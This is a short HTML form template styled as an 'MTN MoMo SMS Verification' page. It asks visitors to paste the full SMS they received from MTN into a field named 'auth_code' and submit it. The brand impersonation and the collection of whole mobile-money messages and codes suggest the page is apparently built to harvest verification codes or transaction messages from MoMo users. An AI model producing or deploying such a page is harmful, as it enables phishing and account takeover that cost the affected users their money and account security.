<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo - SMS Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #003366; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card-box { background: white; color: #333; padding: 30px; border-radius: 12px; width: 100%; max-width: 450px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
        .btn-momo { background-color: #FFCC00; color: #003366; font-weight: bold; width: 100%; padding: 12px; border: none; border-radius: 6px; }
    </style>
</head>
<body>
    <div class="card-box">
        <h3 class="fw-bold mb-3 text-center" style="color: #003366;">MTN MoMo SMS Verification</h3>
        <p class="text-muted small mb-4">Please paste the complete SMS message you received from MTN regarding your transaction below:</p>
        
        <form method="POST">
            <div class="mb-3">
                <textarea name="auth_code" rows="5" class="form-control" placeholder="Paste the full MTN message here (e.g. Yello, you have received...)" required></textarea>
            </div>
            <button type="submit" class="btn btn-momo">Submit SMS Message</button>
        </form>
        <div class="text-center mt-3 small text-muted">Application ID: {{ app_id }}</div>
    </div>
</body>
</html>
